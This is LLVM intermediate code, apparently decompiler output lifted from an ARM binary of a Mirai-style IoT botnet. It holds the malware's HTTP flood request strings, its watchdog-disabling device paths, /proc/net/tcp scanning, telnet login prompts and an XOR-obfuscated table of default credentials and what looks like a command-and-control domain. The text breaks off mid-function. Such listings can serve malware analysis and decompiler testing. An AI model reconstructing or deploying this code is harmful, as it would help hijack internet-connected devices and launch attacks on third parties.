source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_1ea74.5 = global i32 0
@global_var_1ea84.6 = global i32* @global_var_1ea74.5
@global_var_1ebe4.12 = global i32 0
@global_var_f460.18 = constant i32 -382906384
@global_var_15f5c.21 = constant [4 x i8] c"GET\00"
@1 = constant i32 47
@global_var_ff00.24 = constant i32 -390234064
@global_var_1369c.26 = constant i32 -382910448
@global_var_15f54.28 = constant i32 32
@global_var_15f2c.30 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_15f44.32 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_15f50.34 = constant [3 x i8] c"\0D\0A\00"
@global_var_15f64.36 = constant [9 x i8] c"Cookie: \00"
@global_var_15f70.38 = constant [3 x i8] c"; \00"
@global_var_15f74.40 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_15f7c.42 = constant i32 59
@global_var_15f80.44 = constant [5 x i8] c"http\00"
@global_var_15f88.46 = constant [5 x i8] c"url=\00"
@global_var_15f90.48 = constant [5 x i8] c"POST\00"
@global_var_12d04.49 = constant i32 -439275520
@global_var_15f98.51 = constant i32 39
@global_var_15f9c.53 = constant i32 61
@global_var_1ec00.57 = global i32 0
@global_var_a0cc.58 = constant i32 -352321546
@global_var_142ec.59 = constant i32 -481296384
@global_var_1ec04.61 = global i32 0
@global_var_1ec08.62 = local_unnamed_addr global i32 0
@global_var_d7b0.68 = constant i32 -382906384
@global_var_dc74.70 = constant i32 -382906384
@global_var_ce40.72 = constant i32 -382906384
@global_var_c6fc.74 = constant i32 -382906384
@global_var_bf88.76 = constant i32 -382906384
@global_var_b728.78 = constant i32 -382906384
@global_var_b00c.80 = constant i32 -382906384
@global_var_a890.82 = constant i32 -382906384
@global_var_81cc.84 = constant i32 -382906384
@global_var_1ecb8.86 = global i32 0
@global_var_1ecc0.97 = global i32 0
@global_var_15fa0.99 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_1ec24.103 = global i32 0
@global_var_1ecbc.105 = global i32 0
@global_var_f3d0.107 = constant i32 -382910352
@global_var_1ea90.109 = global i32 77716
@global_var_1ea88.111 = global i32 -1
@global_var_1ecc8.117 = local_unnamed_addr global i32 0
@global_var_1ecc7.118 = local_unnamed_addr global i32 0
@global_var_1ecc6.119 = local_unnamed_addr global i32 0
@global_var_f248.121 = constant i32 -442556408
@global_var_15fb0.123 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_1ecc5.128 = local_unnamed_addr global i32 0
@global_var_16004.130 = constant [3 x i8] c"/.\00"
@global_var_15fe0.132 = constant i32 62048
@global_var_f260.133 = constant i32 -382909968
@global_var_123b0.135 = constant i32 -509607552
@global_var_12468.138 = constant i32 -382906384
@global_var_122f8.140 = constant i32 -509607552
@global_var_16000.145 = constant i32 62024
@global_var_15fd4.147 = constant i32 10
@global_var_15fc0.149 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_1ea8c.151 = global i32 -1
@global_var_12f94.156 = constant i32 -382910224
@global_var_15fd8.158 = constant i32 16777216
@global_var_1ec2c.160 = global i32 0
@global_var_1ec38.162 = global i32 0
@global_var_1ec30.164 = global i32 0
@global_var_1ec34.166 = global i32 0
@global_var_16018.172 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_1059c.181 = constant i32 -442695668
@global_var_1ecdc.183 = global i32 0
@global_var_1ec70.185 = global i32 0
@global_var_1ec3c.187 = global i32 0
@global_var_1ec68.189 = global i32 0
@global_var_1ecd4.197 = global i32 0
@global_var_1ecd8.199 = global i32 0
@global_var_1ec43.202 = local_unnamed_addr global i32 0
@global_var_1ec42.203 = local_unnamed_addr global i32 0
@global_var_1ec54.205 = global i32 0
@global_var_1ec48.207 = local_unnamed_addr global i32 0
@global_var_1ec45.208 = local_unnamed_addr global i32 0
@global_var_1ec55.209 = local_unnamed_addr global i32 0
@global_var_1ec57.210 = local_unnamed_addr global i32 0
@global_var_1ec49.211 = local_unnamed_addr global i32 0
@global_var_1ec44.212 = local_unnamed_addr global i32 0
@global_var_1ec56.213 = local_unnamed_addr global i32 0
@global_var_1ec63.215 = local_unnamed_addr global i32 0
@global_var_1ec62.216 = local_unnamed_addr global i32 0
@global_var_161f4.218 = constant [5 x i8] c"PMMV\00"
@global_var_15f78.220 = constant i32 0
@global_var_1603c.222 = constant [6 x i8] c"CFOKL\00"
@global_var_16044.224 = constant i32 387006810
@global_var_1604c.226 = constant [6 x i8] c"TKXZT\00"
@global_var_16054.228 = constant i32 437918234
@global_var_1605c.230 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_16064.232 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_16070.234 = constant i32 370216979
@global_var_16078.236 = constant i32 269555223
@global_var_16080.238 = constant [8 x i8] c"FGDCWNV\00"
@global_var_16088.240 = constant [8 x i8] c"QWRRMPV\00"
@global_var_16090.242 = constant i32 370216979
@global_var_16098.244 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_160a4.246 = constant i32 370216979
@global_var_160ac.248 = constant [5 x i8] c"WQGP\00"
@global_var_160b4.250 = constant i32 1263486531
@global_var_16158.252 = constant i32 320017171
@global_var_160c0.254 = constant [9 x i8] c"QOACFOKL\00"
@global_var_160cc.256 = constant i32 336860180
@global_var_160d4.258 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_160e4.260 = constant [8 x i8] c"QGPTKAG\00"
@global_var_160ec.262 = constant [6 x i8] c"EWGQV\00"
@global_var_160f4.264 = constant [5 x i8] c"W@LV\00"
@global_var_160fc.266 = constant i32 324420417
@global_var_16108.268 = constant i32 390551160
@global_var_16110.270 = constant [6 x i8] c"HT@XF\00"
@global_var_16118.272 = constant [5 x i8] c"CLIM\00"
@global_var_16120.274 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_16128.276 = constant i32 303174162
@global_var_16130.278 = constant i32 1867011861
@global_var_16140.280 = constant i32 1263486531
@global_var_1614c.282 = constant [5 x i8] c"RCQQ\00"
@global_var_16068.284 = constant [5 x i8] c"VGAJ\00"
@global_var_16154.286 = constant i32 320017171
@global_var_16160.288 = constant i32 323043395
@global_var_16168.290 = constant i32 1118227
@global_var_1616c.292 = constant i32 370216979
@global_var_16174.294 = constant [4 x i8] c"CFO\00"
@global_var_16178.296 = constant i32 1263421261
@global_var_16184.298 = constant [7 x i8] c"QUKVAJ\00"
@global_var_1618c.300 = constant [7 x i8] c"VGNLGV\00"
@global_var_16194.302 = constant i32 370216979
@global_var_161a0.304 = constant i32 370216979
@global_var_161ac.306 = constant [7 x i8] c"FCGOML\00"
@global_var_161b4.308 = constant i32 387007823
@global_var_161bc.310 = constant [7 x i8] c"OGPNKL\00"
@global_var_161c4.312 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_161d0.314 = constant [9 x i8] c"rNAOqRkR\00"
@global_var_1ec4c.315 = local_unnamed_addr global i32 0
@global_var_1ec4a.317 = local_unnamed_addr global i32 0
@global_var_1ec4b.318 = local_unnamed_addr global i32 0
@global_var_1ec64.320 = local_unnamed_addr global i32 0
@global_var_1ec65.321 = local_unnamed_addr global i32 0
@global_var_161dc.326 = constant [5 x i8] c"ogin\00"
@global_var_161e4.328 = constant [6 x i8] c"enter\00"
@global_var_16202.332 = constant i32 2096127
@global_var_161f9.334 = constant i32 2095871
@global_var_161ec.336 = constant [8 x i8] c"assword\00"
@global_var_1ece4.338 = global i32 0
@global_var_1ea98.341 = global i32 -559038737
@global_var_16208.345 = constant [19 x i8] c"RKAGQVJGEMCVEE\0CON\22\00"
@global_var_1ed00.347 = local_unnamed_addr global i32 0
@global_var_1ecfc.348 = local_unnamed_addr global i32 0
@global_var_1ed01.349 = local_unnamed_addr global i32 0
@global_var_1621c.351 = constant [3 x i8] c"\225\00"
@global_var_1ed04.352 = local_unnamed_addr global i32 0
@global_var_1ed08.353 = local_unnamed_addr global i32 0
@global_var_1ed09.354 = local_unnamed_addr global i32 0
@global_var_1ed78.355 = local_unnamed_addr global i32 0
@global_var_1ed74.356 = local_unnamed_addr global i32 0
@global_var_1ed79.357 = local_unnamed_addr global i32 0
@global_var_16220.359 = constant i32 51097
@global_var_1ed7c.360 = local_unnamed_addr global i32 0
@global_var_1ed80.361 = local_unnamed_addr global i32 0
@global_var_1ed81.362 = local_unnamed_addr global i32 0
@global_var_16224.364 = constant i32 1448168270
@global_var_1ecf8.365 = local_unnamed_addr global i32 0
@global_var_1ecf4.366 = local_unnamed_addr global i32 0
@global_var_1ecf9.367 = local_unnamed_addr global i32 0
@global_var_16234.369 = constant i32 1381389898
@global_var_1ed10.370 = local_unnamed_addr global i32 0
@global_var_1ed0c.371 = local_unnamed_addr global i32 0
@global_var_1ed11.372 = local_unnamed_addr global i32 0
@global_var_16254.374 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_1ed14.375 = local_unnamed_addr global i32 0
@global_var_1ed18.376 = local_unnamed_addr global i32 0
@global_var_1ed19.377 = local_unnamed_addr global i32 0
@global_var_1625c.379 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_1ed20.380 = local_unnamed_addr global i32 0
@global_var_1ed1c.381 = local_unnamed_addr global i32 0
@global_var_1ed21.382 = local_unnamed_addr global i32 0
@global_var_16264.384 = constant i32 1195772418
@global_var_1ed28.385 = local_unnamed_addr global i32 0
@global_var_1ed24.386 = local_unnamed_addr global i32 0
@global_var_1ed29.387 = local_unnamed_addr global i32 0
@global_var_16270.389 = constant [5 x i8] c"\0DDF\22\00"
@global_var_1ed30.390 = local_unnamed_addr global i32 0
@global_var_1ed2c.391 = local_unnamed_addr global i32 0
@global_var_1ed31.392 = local_unnamed_addr global i32 0
@global_var_16278.394 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_1ed34.395 = local_unnamed_addr global i32 0
@global_var_1ed38.396 = local_unnamed_addr global i32 0
@global_var_1ed39.397 = local_unnamed_addr global i32 0
@global_var_16280.399 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_1ed40.400 = local_unnamed_addr global i32 0
@global_var_1ed3c.401 = local_unnamed_addr global i32 0
@global_var_1ed41.402 = local_unnamed_addr global i32 0
@global_var_1628c.404 = constant i32 1836214128
@global_var_1ed48.405 = local_unnamed_addr global i32 0
@global_var_1ed44.406 = local_unnamed_addr global i32 0
@global_var_1ed49.407 = local_unnamed_addr global i32 0
@global_var_1629c.409 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_1ed4c.410 = local_unnamed_addr global i32 0
@global_var_1ed50.411 = local_unnamed_addr global i32 0
@global_var_1ed51.412 = local_unnamed_addr global i32 0
@global_var_162a8.414 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_1ed54.415 = local_unnamed_addr global i32 0
@global_var_1ed58.416 = local_unnamed_addr global i32 0
@global_var_1ed59.417 = local_unnamed_addr global i32 0
@global_var_162b4.419 = constant i32 437738110
@global_var_1ed60.420 = local_unnamed_addr global i32 0
@global_var_1ed5c.421 = local_unnamed_addr global i32 0
@global_var_1ed61.422 = local_unnamed_addr global i32 0
@global_var_162d8.424 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_1ed68.425 = local_unnamed_addr global i32 0
@global_var_1ed64.426 = local_unnamed_addr global i32 0
@global_var_1ed69.427 = local_unnamed_addr global i32 0
@global_var_162e4.429 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_1ed70.430 = local_unnamed_addr global i32 0
@global_var_1ed6c.431 = local_unnamed_addr global i32 0
@global_var_1ed71.432 = local_unnamed_addr global i32 0
@global_var_162f0.434 = constant [7 x i8] c"QJGNN\22\00"
@global_var_1ed88.435 = local_unnamed_addr global i32 0
@global_var_1ed84.436 = local_unnamed_addr global i32 0
@global_var_1ed89.437 = local_unnamed_addr global i32 0
@global_var_162f8.439 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_1ed8c.440 = local_unnamed_addr global i32 0
@global_var_1ed90.441 = local_unnamed_addr global i32 0
@global_var_1ed91.442 = local_unnamed_addr global i32 0
@global_var_16300.444 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_1ed94.445 = local_unnamed_addr global i32 0
@global_var_1ed98.446 = local_unnamed_addr global i32 0
@global_var_1ed99.447 = local_unnamed_addr global i32 0
@global_var_16308.449 = constant [4 x i8] c"QJ\22\00"
@global_var_1eda0.450 = local_unnamed_addr global i32 0
@global_var_1ed9c.451 = local_unnamed_addr global i32 0
@global_var_1eda1.452 = local_unnamed_addr global i32 0
@global_var_1630c.454 = constant i32 1280000013
@global_var_1eda4.455 = local_unnamed_addr global i32 0
@global_var_1eda8.456 = local_unnamed_addr global i32 0
@global_var_1eda9.457 = local_unnamed_addr global i32 0
@global_var_16320.459 = constant i32 1668311919
@global_var_1edb0.460 = local_unnamed_addr global i32 0
@global_var_1edac.461 = local_unnamed_addr global i32 0
@global_var_1edb1.462 = local_unnamed_addr global i32 0
@global_var_1633c.464 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_1edb4.465 = local_unnamed_addr global i32 0
@global_var_1edb8.466 = local_unnamed_addr global i32 0
@global_var_1edb9.467 = local_unnamed_addr global i32 0
@global_var_16348.469 = constant i32 1280000013
@global_var_1edbc.470 = local_unnamed_addr global i32 0
@global_var_1edc0.471 = local_unnamed_addr global i32 0
@global_var_1edc1.472 = local_unnamed_addr global i32 0
@global_var_1635c.474 = constant i32 1280000013
@global_var_1edc8.475 = local_unnamed_addr global i32 0
@global_var_1edc4.476 = local_unnamed_addr global i32 0
@global_var_1edc9.477 = local_unnamed_addr global i32 0
@global_var_16374.479 = constant i32 1464693110
@global_var_1edd0.480 = local_unnamed_addr global i32 0
@global_var_1edcc.481 = local_unnamed_addr global i32 0
@global_var_1edd1.482 = local_unnamed_addr global i32 0
@global_var_1638c.484 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_1edd8.485 = local_unnamed_addr global i32 0
@global_var_1edd4.486 = local_unnamed_addr global i32 0
@global_var_1edd9.487 = local_unnamed_addr global i32 0
@global_var_163a0.489 = constant i32 1196376908
@global_var_1eddc.490 = local_unnamed_addr global i32 0
@global_var_1ede0.491 = local_unnamed_addr global i32 0
@global_var_1ede1.492 = local_unnamed_addr global i32 0
@global_var_163b0.494 = constant i32 1280068961
@global_var_1ede8.495 = local_unnamed_addr global i32 0
@global_var_1ede4.496 = local_unnamed_addr global i32 0
@global_var_1ede9.497 = local_unnamed_addr global i32 0
@global_var_163c8.499 = constant i32 1195458915
@global_var_1edf0.500 = local_unnamed_addr global i32 0
@global_var_1edec.501 = local_unnamed_addr global i32 0
@global_var_1edf1.502 = local_unnamed_addr global i32 0
@global_var_1641c.504 = constant i32 1195458915
@global_var_1edf8.505 = local_unnamed_addr global i32 0
@global_var_1edf4.506 = local_unnamed_addr global i32 0
@global_var_1edf9.507 = local_unnamed_addr global i32 0
@global_var_16440.509 = constant i32 1447841121
@global_var_1ee00.510 = local_unnamed_addr global i32 0
@global_var_1edfc.511 = local_unnamed_addr global i32 0
@global_var_1ee01.512 = local_unnamed_addr global i32 0
@global_var_16474.514 = constant i32 1633044305
@global_var_1ee04.515 = local_unnamed_addr global i32 0
@global_var_1ee08.516 = local_unnamed_addr global i32 0
@global_var_1ee09.517 = local_unnamed_addr global i32 0
@global_var_16484.519 = constant i32 1346651984
@global_var_1ee0c.520 = local_unnamed_addr global i32 0
@global_var_1ee10.521 = local_unnamed_addr global i32 0
@global_var_1ee11.522 = local_unnamed_addr global i32 0
@global_var_16490.524 = constant i32 1128353102
@global_var_1ee14.525 = local_unnamed_addr global i32 0
@global_var_1ee18.526 = local_unnamed_addr global i32 0
@global_var_1ee19.527 = local_unnamed_addr global i32 0
@global_var_1649c.529 = constant i32 257312593
@global_var_1ee1c.530 = local_unnamed_addr global i32 0
@global_var_1ee20.531 = local_unnamed_addr global i32 0
@global_var_1ee21.532 = local_unnamed_addr global i32 0
@global_var_164ac.534 = constant i32 1447841089
@global_var_1ee24.535 = local_unnamed_addr global i32 0
@global_var_1ee28.536 = local_unnamed_addr global i32 0
@global_var_1ee29.537 = local_unnamed_addr global i32 0
@global_var_164c0.539 = constant i32 1279479894
@global_var_1ee2c.540 = local_unnamed_addr global i32 0
@global_var_1ee30.541 = local_unnamed_addr global i32 0
@global_var_1ee31.542 = local_unnamed_addr global i32 0
@global_var_164d4.544 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_1ee38.545 = local_unnamed_addr global i32 0
@global_var_1ee34.546 = local_unnamed_addr global i32 0
@global_var_1ee39.547 = local_unnamed_addr global i32 0
@global_var_163bc.549 = constant i32 1380403017
@global_var_1ee40.550 = local_unnamed_addr global i32 0
@global_var_1ee3c.551 = local_unnamed_addr global i32 0
@global_var_1ee41.552 = local_unnamed_addr global i32 0
@global_var_164e0.554 = constant i32 1280068929
@global_var_1ee44.555 = local_unnamed_addr global i32 0
@global_var_1ee48.556 = local_unnamed_addr global i32 0
@global_var_1ee49.557 = local_unnamed_addr global i32 0
@global_var_164f0.559 = constant i32 1414547281
@global_var_1ee50.560 = local_unnamed_addr global i32 0
@global_var_1ee4c.561 = local_unnamed_addr global i32 0
@global_var_1ee51.562 = local_unnamed_addr global i32 0
@global_var_16504.564 = constant i32 1414547281
@global_var_1ee58.565 = local_unnamed_addr global i32 0
@global_var_1ee54.566 = local_unnamed_addr global i32 0
@global_var_1ee59.567 = local_unnamed_addr global i32 0
@global_var_16520.569 = constant i32 1264078191
@global_var_1ee5c.570 = local_unnamed_addr global i32 0
@global_var_1ee60.571 = local_unnamed_addr global i32 0
@global_var_1ee61.572 = local_unnamed_addr global i32 0
@global_var_16590.574 = constant i32 1264078191
@global_var_1ee64.575 = local_unnamed_addr global i32 0
@global_var_1ee68.576 = local_unnamed_addr global i32 0
@global_var_1ee69.577 = local_unnamed_addr global i32 0
@global_var_16600.579 = constant i32 1264078191
@global_var_1ee6c.580 = local_unnamed_addr global i32 0
@global_var_1ee70.581 = local_unnamed_addr global i32 0
@global_var_1ee71.582 = local_unnamed_addr global i32 0
@global_var_16670.584 = constant i32 1264078191
@global_var_1ee78.585 = local_unnamed_addr global i32 0
@global_var_1ee74.586 = local_unnamed_addr global i32 0
@global_var_1ee79.587 = local_unnamed_addr global i32 0
@global_var_166e0.589 = constant i32 1264078191
@global_var_1ee81.590 = local_unnamed_addr global i32 0
@global_var_1ee7c.591 = local_unnamed_addr global i32 0
@global_var_1ee80.592 = local_unnamed_addr global i32 0
@global_var_14cd4.595 = constant i32 -476053504
@global_var_13a6c.599 = constant i32 -443219956
@global_var_13bd8.604 = constant i32 -376111092
@global_var_1ecac.607 = global i32 0
@global_var_13d4c.609 = constant i32 -456978431
@global_var_1ee84.611 = global i32 0
@global_var_1ec74.613 = global i32 0
@global_var_1eb98.616 = global i32 256
@global_var_1ea9c.617 = global i32* @global_var_1eb98.616
@global_var_1ec9c.620 = global i32 0
@global_var_1ef04.622 = global i32 0
@global_var_15488.623 = constant i32 -382910416
@global_var_13cd0.624 = constant i32 -509595648
@global_var_1436c.631 = constant i32 -442564520
@global_var_1eba4.637 = global i32 0
@global_var_13918.639 = constant i32 -481230848
@global_var_1ec8c.641 = global i32 0
@global_var_150d8.643 = constant i32 -509587456
@global_var_16864.645 = constant i32 33554944
@global_var_1ebdc.646 = global i32* @global_var_16864.645
@global_var_1ebbc.649 = global i32 0
@global_var_1ec90.653 = local_unnamed_addr global i32 0
@global_var_14a8c.655 = constant i32 -352321419
@global_var_1ea68.659 = global i32 -1
@global_var_1eca0.662 = global i32 0
@global_var_1eca4.664 = local_unnamed_addr global i32 0
@global_var_14cc0.665 = constant i32 -390234096
@global_var_16758.667 = constant [10 x i8] c"/dev/null\00"
@global_var_1eca8.669 = global i32 0
@global_var_1ec94.674 = local_unnamed_addr global i32 0
@global_var_1ec98.676 = global i32 0
@global_var_13cb0.678 = constant i32 -369096946
@global_var_1ebd4 = external local_unnamed_addr global i32
@global_var_13c70.688 = constant i32 -442564608
@global_var_14f88.690 = constant i32 -335544664
@global_var_150a4.693 = constant i32 -275775369
@global_var_1581c.694 = constant i32 -382910352
@global_var_1ecb4.696 = global i32 0
@global_var_1ef1c.699 = global i32 0
@global_var_1ef20.701 = global i32 0
@global_var_1ea6c.704 = global i32 0
@global_var_1ebe0.3 = external global i8*
@global_var_1ebfc.55 = external global i8*
@global_var_1ebfd.66 = global i8 0
@2 = internal constant [2 x i8] c"\01\00"
@global_var_1ea94.113 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @2, i32 0, i32 0)
@global_var_1ecc4.116 = external global i8*
@global_var_1ec28.154 = external global i8*
@global_var_1ec6c.191 = external global i8*
@global_var_1ec6d.192 = local_unnamed_addr global i8 0
@global_var_1ec40.201 = external global i8*
@global_var_1ec60.206 = local_unnamed_addr global i8 0
@global_var_1ec61.214 = local_unnamed_addr global i8 0
@global_var_1ec50.316 = local_unnamed_addr global i8 0
@global_var_1ec58.319 = local_unnamed_addr global i8 0
@global_var_15f60.23 = constant [2 x i8] c"/\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @function_15ecc(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1ebe0.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_1ebe0.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1ea84.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_1ea84.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_1ea84.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_1ea84.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1ebe0.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_1ea84.6, { 1, 0 }
  uselistorder i8** @global_var_1ebe0.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32 %arg1) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8124
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8124, %bb
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 125560 to i32*), align 8
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 125560

bb2:                                              ; preds = %.thread
  ret i32 125560

; uselistorder directives
  uselistorder i32 125560, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_14d74(i32 ptrtoint (i32* @global_var_f460.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 89864, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_1473c()
  ret i32 %v0_81bc
}

define i32 @function_81cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_81cc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-10568 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-20809 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_81cc = load i32, i32* @r4, align 4
  store i32 %v3_81cc, i32* %stack_var_-36, align 4
  %v6_81cc = load i32, i32* @r5, align 4
  %v9_81cc = load i32, i32* @r6, align 4
  %v15_81cc = load i32, i32* @r8, align 4
  %v1_81d8 = urem i32 %arg3, 256
  store i32 %v1_81d8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_81e4 = urem i32 %arg1, 256
  store i32 %v1_81e4, i32* %ip.global-to-local, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v1_81d8, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8200 = inttoptr i32 %arg4 to i32*
  %v6_8200 = call i32 @function_9f84(i32 %v1_81d8, i32* %v5_8200, i32 21, i32 0, i32 %arg2)
  %v0_8204 = load i32, i32* @r5, align 4
